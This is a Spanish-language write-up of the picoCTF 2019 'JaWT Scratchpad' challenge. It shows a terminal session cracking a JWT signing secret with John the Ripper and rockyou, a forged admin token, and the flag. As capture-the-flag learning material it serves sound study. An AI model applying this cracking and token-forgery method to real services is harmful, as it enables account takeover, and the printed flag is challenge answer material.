## Descripción
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090

## Hints
+ What is that cookie?
+ Have you heard of JWT?


## Solución

Cookie obtenida de JWT  usuario Ramiro 
```  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiUmFtaXJvIn0.9QSqLrGJG-fKHwYw6J5On3ovOU48kUgV_7-MtTVcmGo
```

``` bash
┌─[ramdark@parrot]─[~]
└──╼ $ls /usr/share/wordlists
dirb       dnsmap.txt     fern-wifi   nmap.lst        wfuzz
dirbuster  fasttrack.txt  metasploit  rockyou.txt.gz
┌─[ramdark@parrot]─[~]
└──╼ $sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
[sudo] password for ramdark: 
┌─[ramdark@parrot]─[~]
└──╼ $ls /usr/share/wordlists/
dirb       dnsmap.txt     fern-wifi   nmap.lst     wfuzz
dirbuster  fasttrack.txt  metasploit  rockyou.txt
┌─[✗]─[ramdark@parrot]─[~]
└──╼ $sudo apt install john
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
john is already the newest version (1.9.0-Jumbo-1-1parrot3).
john set to manually installed.
0 upgraded, 0 newly installed, 0 to remove and 255 not upgraded.
┌─[ramdark@parrot]─[~]
└──╼ $ls
'Burp Suite'   Documents   Music      Public      Videos
 Desktop       Downloads   Pictures   Templates
┌─[ramdark@parrot]─[~]
└──╼ $cd Documents/Hacking_Notes_RFC/
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC]
└──╼ $ls
'Examen Parcial 1'   README.md   retos-bandit   Retos-picoCTF
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC]
└──╼ $cd Retos-picoCTF/
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Retos-picoCTF]
└──╼ $ls
2019-WebExploitation_RamiroFelixCastaneda
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Retos-picoCTF]
└──╼ $cd 2019-WebExploitation_RamiroFelixCastaneda/
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Retos-picoCTF/2019-WebExploitation_RamiroFelixCastaneda]
└──╼ $ls
 01-Insp3ct0r.md              '07-Irish-Name-Repo 1.md'
'02-Where are the robots.md'  '08-Irish-Name-Repo 2.md'
 03-Logon.md                  '09-Irish-Name-Repo 3.md'
 04-Dont-use-client-side.md   '10-JaWT Scratchpad.md'
 05-picobrowser.md             hash
 06-Client-side-again.md
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Retos-picoCTF/2019-WebExploitation_RamiroFelixCastaneda]
└──╼ $john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:04 DONE (2023-03-12 04:38) 0.2145g/s 1587Kp/s 1587Kc/s 1587KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Retos-picoCTF/2019-WebExploitation_RamiroFelixCastaneda]
└──╼ $

```

Cookie cambiando usuario admin y con firma de token "ilovepico "
```  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```



## Flag

``` picoCTF{jawt_was_just_what_you_thought_f859ab2f} ```


## Notas adicionales
Tomando la cokie JWT se hace uso del jwt.io para alterar la cokie firmada, la firma se encuentra con john the ripper. 


## Referencias
+ [JSON](https://en.wikipedia.org/wiki/JSON)
+ [JWT](https://jwt.io/introduction)
+ [Debugger](https://jwt.io/#debugger-io)
+ [OpenWall](https://github.com/openwall/john)
